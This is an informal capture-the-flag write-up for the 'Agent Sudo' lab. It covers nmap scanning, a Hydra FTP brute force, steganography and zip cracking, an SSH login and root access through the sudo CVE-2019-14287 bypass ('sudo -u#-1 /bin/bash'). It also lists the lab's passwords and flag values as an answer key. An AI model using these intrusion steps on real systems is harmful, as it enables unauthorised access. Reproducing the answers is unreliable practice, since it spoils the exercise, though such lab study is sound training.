# Agent Sudo

# first we do scan with nmap we fournd
- 21 ftp
- 22 ssh
- 80 tcp

# second we use burpsute to change agent name until 
Agent C
his name is chris

# third we do brute force on ftp server to get password of chris using hydra
the password is ==> crystal

# we sgin in ftp server and found 
To_agentJ.txt
cute-alien.jpg
cutie.png
= and we get them to our device

the massage in to_agent.txt told us there is password in photos 

# we use binwalk on cutie.png 
wefoud
hidden dir:
  365
  365.zlib
  8702.zip
  To_agentR.txt

# and we use john to crack password of zip fiel
=> zip2john 8702.zip > new.txt

=> john new.txt 

=== found password : alien 

# and use 7z tool 

=> 7z e 8702.zip
and enter the password : alien 

and after that we cat To_agentR.txt

and wefound steg password: Area51

# then use steghide -extract -sf cute-alien.jpg
and we foud "message.txt"
the message is to 
  james
and it says his login password is ``hackerrules!``

# now we connect to ssh using james@10.10.130.39
and we found userflag.txt: b03d975e8c92a7c04146cfa7a5a313c7

and found image Alien_autospy.jpg 
i did search on it on google photos and found that is Roswell
# now i need to do previllage esclation 
== ``sudo -l``
i found :
           (ALL, !root) /bin/bash
i search for it on exploit DB i found :
         CVE-2019-14287
         sudo -u#-1 /bin/bash  == i run this command and i became root ==
and i found root flag in /root
     flag : b53a02f55b57d4439e3341834d70c062
and the name of agent R was in the same file it was DesKel
